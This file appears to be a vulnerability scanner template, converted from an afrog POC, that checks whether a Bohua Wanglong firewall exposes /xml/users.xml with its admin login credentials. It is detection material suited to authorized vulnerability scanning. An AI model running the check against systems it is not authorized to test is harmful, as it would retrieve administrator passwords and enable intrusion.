# 来源: afrog（转换自 afrog/xray 表达式 POC）
http:
  - matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - name="admin"
          - pwd="
        condition: and
    method: GET
    path:
      - '{{BaseURL}}/xml/users.xml'
id: bohuawanglong-users-xml-password-leak
info:
  author: zan8in
  description: |
    博华网龙防火墙 users.xml文件 可被任意用户读取，其中包含登录的账号密码
    "博华网龙防火墙"
  metadata:
    argus-execution-class: detection
    argus-import-license: MIT License
    argus-import-source: afrog
    argus-risk-level: high
  name: 博华网龙防火墙 users.xml 未授权访问
  severity: high
  tags: bohuawanglong,usersxml,unauthorizedaccess,argus-import
